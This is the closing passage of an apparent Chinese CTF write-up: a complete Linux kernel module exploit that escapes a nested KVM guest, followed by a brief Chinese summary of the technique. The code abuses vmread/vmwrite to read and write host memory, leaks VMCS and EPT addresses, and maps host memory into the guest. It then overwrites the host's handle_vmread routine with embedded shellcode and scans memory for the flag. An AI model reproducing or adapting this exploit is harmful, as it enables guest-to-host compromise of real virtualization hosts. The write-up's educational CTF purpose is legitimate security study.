const uint8_t shellcode[] = "\x50\x53\x51\x52\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x57\x56\x48\xb8\x04\x00\x00\x00\x00\xfe\xff\xff\x48\x8b\x00\x48\x2d\x00\x8e\x00\x01\x49\x89\xc4\x4d\x89\xe5\x49\x81\xc5\xd0\xda\x0b\x00\x4d\x89\xe6\x49\x81\xc6\xa0\x2c\xa5\x01\x4c\x89\xf7\x41\xff\xd5\x4d\x89\xe3\x49\x81\xc3\x20\x24\x29\x00\x48\xb8\x61\x67\x2e\x74\x78\x74\x00\x00\x50\x48\xb8\x2f\x72\x6f\x6f\x74\x2f\x66\x6c\x50\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x41\xff\xd3\x49\x89\xc2\x4d\x89\xe3\x49\x81\xc3\x70\x4c\x29\x00\x4d\x89\xe1\x49\x81\xc1\x00\xb0\x8a\x01\x4c\x89\xd7\x4c\x89\xce\x48\xc7\xc2\x00\x01\x00\x00\x48\xc7\xc1\x00\x00\x00\x00\x41\xff\xd3\x58\x58\x5e\x5f\x41\x5d\x41\x5e\x41\x5c\x41\x5b\x41\x5a\x41\x59\x5a\x59\x5b\x58";

uint64_t vmxon_page_pa, vmptrld_page_pa;

static __always_inline unsigned long long native_get_debugreg(int regno)
{
    unsigned long val = 0;    /* Damn you, gcc! */

    switch (regno) {
    case 0:
        asm("mov %%db0, %0" :"=r" (val));
        break;
    case 1:
        asm("mov %%db1, %0" :"=r" (val));
        break;
    case 2:
        asm("mov %%db2, %0" :"=r" (val));
        break;
    case 3:
        asm("mov %%db3, %0" :"=r" (val));
        break;
    case 6:
        asm("mov %%db6, %0" :"=r" (val));
        break;
    case 7:
        asm("mov %%db7, %0" :"=r" (val));
        break;
    default:
        BUG();
    }
    return val;
}

static __always_inline void native_set_debugreg(int regno, unsigned long value)
{
    switch (regno) {
    case 0:
        asm("mov %0, %%db0"    ::"r" (value));
        break;
    case 1:
        asm("mov %0, %%db1"    ::"r" (value));
        break;
    case 2:
        asm("mov %0, %%db2"    ::"r" (value));
        break;
    case 3:
        asm("mov %0, %%db3"    ::"r" (value));
        break;
    case 6:
        asm("mov %0, %%db6"    ::"r" (value));
        break;
    case 7:
        asm("mov %0, %%db7"    ::"r" (value));
        break;
    default:
        BUG();
    }
}

static noinline uint64_t read_cr3(void) {
    uint64_t val = 0;
        asm("mov %%cr3, %0" :"=r" (val));
    return val;
}

static noinline uint64_t read_guy(unsigned long offset) {
    uint64_t val = 0;

    uint64_t vmread_field = 0;
    uint64_t vmread_value = 0;

    native_set_debugreg(0, 0x1337babe);
    native_set_debugreg(1, offset);
    asm volatile( "vmread %[field], %[output]\n\t"
              : [output] "=r" (vmread_value)
              : [field] "r" (vmread_field) : );
    val = native_get_debugreg(2);

    return val;
}

static noinline void write_guy(unsigned long offset, unsigned long value) {
    uint64_t vmwrite_field = 0;
    uint64_t vmwrite_value = 0;

    native_set_debugreg(0, 0x1337babe);
    native_set_debugreg(1, offset);
    native_set_debugreg(2, value);
    asm volatile( "vmwrite %[value], %[field]\n\t"
          :
          : [field] "r" (vmwrite_field),
            [value] "r" (vmwrite_value) : );
}

#define IDT_BASE 0xfffffe0000000000ull

static noinline int find_l1_vmcs(uint64_t *l1_vmcs_offset) {
    unsigned long long pos_offset = 0, neg_offset = 0;
    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
    uint64_t found_val = 0, found_offset = 0;
    uint64_t i = 0;

    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);

    // scan in each direction looking for the guest_idtr_base field of the l1 vm
    for (i = 0; i < 0x4000; i++) {
        // from attaching to the l1 guest, the address of guest_idtr_base always has 0x208 in the lower 3 nibbles
        pos_offset = ((i * 0x1000) + 0x208) / 8;
        neg_offset = ((i * -1 * 0x1000) + 0x208) / 8;

        pos_val = read_guy(pos_offset);
        if (pos_val == IDT_BASE) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }

        neg_val = read_guy(neg_offset);
        if (neg_val == IDT_BASE) {
            found_val = neg_val;
            found_offset = neg_offset;
            break;
        }

        if (i < 0x20) {
            pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
            pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
        }
    }
    if (found_val == 0) {
        pr_info("[exp]: IDT NOT FOUND :(\n");
        *l1_vmcs_offset = 0;
        return 0;
    } else {
        pr_info("[exp]: Found IDT in l1 at offset %lld; value: %llx\n", found_offset, found_val);
        *l1_vmcs_offset = found_offset;
        return 1;
    }
}

static noinline int find_nested_vmx(uint64_t *nested_vmx_offset) {
    // the nested_vmx struct contains two known values --
    //     the guest phys addrs of the vmxon_ptr and current_vmptr
    // finding this structure allows us to read the `cached_vmcs12` pointer
    // which is the host virtual address of our vmcs, based on that we can
    // figure out where we are at in the l1's virtual address space

    unsigned long long pos_offset = 0, neg_offset = 0;
    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
    uint64_t found_val = 0, found_offset = 0;
    uint64_t i = 0;

    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);
    zero_val = read_guy(1ull);
    pr_info("vmcs12[1] = %llx\n", zero_val);
    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);

    for (i = 1; i < (0x4000*0x200); i += 2) {
        pos_offset = i;
        neg_offset = -i;
        // seen: 0xe8 0x28 0x68

        pos_val = read_guy(pos_offset);
        if (pos_val == vmptrld_page_pa && read_guy(pos_offset-2) == vmxon_page_pa) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }

        // in practice negative offset is rare/impossible?
        // commented out bc it keeps going too far and crashing
        //neg_val = read_guy(neg_offset);
        //if (neg_val == vmptrld_page_pa && read_guy(neg_offset-2) == vmxon_page_pa) {
        //    found_val = neg_val;
        //    found_offset = neg_offset;
        //    break;
        //}

        if (i > 0x1000 && i < 0x2000) {
            pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
            //pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
        }
    }
    if (found_val == 0) {
        pr_info("[exp]: L1 VMCS NOT FOUND :(\n");
        *nested_vmx_offset = 0;
        return 0;
    } else {
        pr_info("[exp]: Found vmcs in l1 at offset %lld; value: %llx\n", found_offset, found_val);
        *nested_vmx_offset = found_offset;
        return 1;
    }
}

static int proc_open(struct inode *inode, struct file *filep) {
    uint64_t l1_vmcs_offset = 0;
    uint64_t nested_vmx_offset = 0;
    uint64_t l2_vmcs_addr = 0;

    uint64_t eptp_value = 0;
    uint64_t ept_offset = 0;
    uint64_t ept_addr = 0;

    uint64_t pml4e_value = 0;
    uint64_t pml4e_offset = 0;
    uint64_t pml4e_addr = 0;

    uint64_t *pgde_page = 0;
    uint64_t pgde_page_pa = 0;

    uint64_t l2_entry = 0;

    uint64_t physbase = 0;
    uint64_t cr3 = 0;
    uint64_t *pgd = 0;

    uint64_t handle_vmread_page = 0;
    uint8_t *handle_vmread = 0;

    uint64_t i;

    if (!find_l1_vmcs(&l1_vmcs_offset)) {
        return 0; // not found
    }

    if (!find_nested_vmx(&nested_vmx_offset)) {
        return 0; // not found
    }

    l2_vmcs_addr = read_guy(nested_vmx_offset+1);
    pr_info("[exp]: YOU ARE HERE: %llx\n", l2_vmcs_addr);

    physbase = l2_vmcs_addr & ~0xfffffffull;
    pr_info("[exp]: probably physbase: %llx\n", l2_vmcs_addr & ~0xfffffff);

    eptp_value = read_guy(l1_vmcs_offset-50);
    pr_info("[exp]: eptp_value: %llx\n", eptp_value);

    ept_addr = physbase + (eptp_value & ~0xfffull);
    pr_info("[exp]: ept_addr: %llx\n", ept_addr);

    ept_offset = (ept_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: ept_offset: %llx\n", ept_offset);

    // read first entry in ept to get the PML4E
    pml4e_value = read_guy(ept_offset);
    pr_info("[exp]: pml4e_value: %llx\n", pml4e_value);

    pml4e_addr = physbase + (pml4e_value & ~0xfffull);
    pr_info("[exp]: pml4e_addr: %llx\n", pml4e_addr);

    pml4e_offset = (pml4e_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: pml4e_offset: %llx\n", pml4e_offset);

    // at 6GB will be an identity mapping of the l1 memory in l2
    write_guy(pml4e_offset + 6, 0x987);

    cr3 = read_cr3();
    pgd = (cr3 & ~0xfffull) + page_offset_base;
    pr_info("[exp]: pgd: %llx\n", pgd);

    pgde_page = kzalloc(0x1000, GFP_KERNEL);
    pgde_page_pa = virt_to_phys(pgde_page);

    // sticking the l1 mapping at the PGD entry the LDT remap usually goes at cuz why not
    pgd[272] = pgde_page_pa | 0x7;

    // huge and rwxp
    l2_entry = 0x180000000 | (1<<7) | 0x3;

    pgde_page[0] = l2_entry;

    // in THEORY I can access memory at 0xffff880000000000 now
    pr_info("TEST: %llx\n", *((uint64_t *)0xffff880000000000));

    // look for 0x3ec6780f to find the page where handle_vmread is at
    for (i = 0; i < (1024ull << 20); i += 0x1000) {
        unsigned int val = *((unsigned int *)(0xffff880000000df8 + i));

        // check the value and check if relocations were applied
        if (val == 0x3ec6780f && *((unsigned int *)(0xffff880000000df8 + 0xb + i)) != 0) {
            handle_vmread_page = 0xffff880000000000 + i;
            break;
        }
    }

    pr_info("found handle_vmread page at: %llx\n", handle_vmread_page);

    handle_vmread = handle_vmread_page + 0x4d0;
    pr_info("handle_vmread at: %llx\n", handle_vmread);

    // I don't want to figure out the address of nested_vmx_succeeded so pad with nops just up to that call
    // and make the instruction just after nested_vmx_succeeded returns be ret
    memset(handle_vmread, 0x90, 0x281);
    handle_vmread[0x286] = 0xc3;

    // -1 to remove null terminator
    memcpy(handle_vmread, shellcode, sizeof(shellcode)-1);

    // do it
    read_guy(0);

    // scan for flag in memory
    for (i = 0; i < 1024ull << 20; i+= 0x1000) {
        if (!memcmp(0xffff880000000000 + i, "corctf{", 7)) {
            pr_info("flag: %s\n", 0xffff880000000000 + i);
            break;
        }
    }

    return 0;
}

static ssize_t proc_read(struct file* filep, char* __user buffer, size_t len, loff_t* offset) {
    return 0;
}

static ssize_t proc_write(struct file* filep, const char* __user u_buffer, size_t len, loff_t* offset) {
    return 0;
}

void __no_profile native_write_cr4(unsigned long val)
{
        unsigned long bits_changed = 0;
        asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");
}

static inline int vmxon(uint64_t phys)
{
        uint8_t ret;

        __asm__ __volatile__ ("vmxon %[pa]; setna %[ret]"
                : [ret]"=rm"(ret)
                : [pa]"m"(phys)
                : "cc", "memory");

        return ret;
}

static inline int vmptrld(uint64_t vmcs_pa)
{
        uint8_t ret;

        __asm__ __volatile__ ("vmptrld %[pa]; setna %[ret]"
                : [ret]"=rm"(ret)
                : [pa]"m"(vmcs_pa)
                : "cc", "memory");

        return ret;
}

static inline uint64_t rdmsr_guy(uint32_t msr)
{
    uint32_t a, d;

    __asm__ __volatile__("rdmsr" : "=a"(a), "=d"(d) : "c"(msr) : "memory");

    return a | ((uint64_t) d << 32);
}

static inline uint32_t vmcs_revision(void)
{
    return rdmsr_guy(MSR_IA32_VMX_BASIC);
}

static int __init proc_init(void)
{
    void *vmxon_page, *vmptrld_page;
    struct proc_dir_entry *new;
    unsigned long cr4;
    int res;

    cr4 = native_read_cr4();
    cr4 |= 1ul << 13;
    native_write_cr4(cr4);

    pr_info("[exp]: set cr4 to %lx", cr4);
    vmxon_page = kzalloc(0x1000, GFP_KERNEL);
    vmptrld_page = kzalloc(0x1000, GFP_KERNEL);

    vmxon_page_pa = virt_to_phys(vmxon_page);
    vmptrld_page_pa = virt_to_phys(vmptrld_page);

    *(uint32_t *)(vmxon_page) = vmcs_revision();
    *(uint32_t *)(vmptrld_page) = vmcs_revision();

    res = vmxon(vmxon_page_pa);
    pr_info("[exp]: vmxon returned %d", res);

    res = vmptrld(vmptrld_page_pa);
    pr_info("[exp]: vmptrld returned %d", res);

    pr_info("[exp]: vmxon_pa %llx", vmxon_page_pa);
    pr_info("[exp]: vmptrld_pa %llx", vmptrld_page_pa);

    pr_info("page_offset_base: %lx\n", page_offset_base);

    new = proc_create("exp", 0777, NULL, &fops);
    pr_info("[exp]: init\n");
    return 0;
}

static void __exit proc_exit(void)
{
    remove_proc_entry("exp", NULL);
    pr_info("exp: exit\n");
}

module_init(proc_init);
module_exit(proc_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("zolutal");
MODULE_DESCRIPTION("bleh");
MODULE_VERSION("0.1");
```

总结
==

首先通过任意相对某个object能够读写，我们通过源码知道其他object特征可以泄露虚拟机的VMCS的偏移，然后再通过next\_vmx结构体特征扫描得到偏移，进而泄露处嵌套虚拟机的VMCS的在主机的虚拟地址，进而知道露虚拟机的VMCS的在主机的虚拟地址。然后得到虚拟机的VMCS机构中的EPTP，进而去往虚拟机的EPT表中的第三级表加入表项和根据CR3往虚拟机页表的第三级表加入表项进而使得虚拟机的的虚拟地址映射到主机的目标物理地址，然后访问虚拟机的的虚拟地址扫描找到主机的handle\_vmread函数，进而覆盖shellcode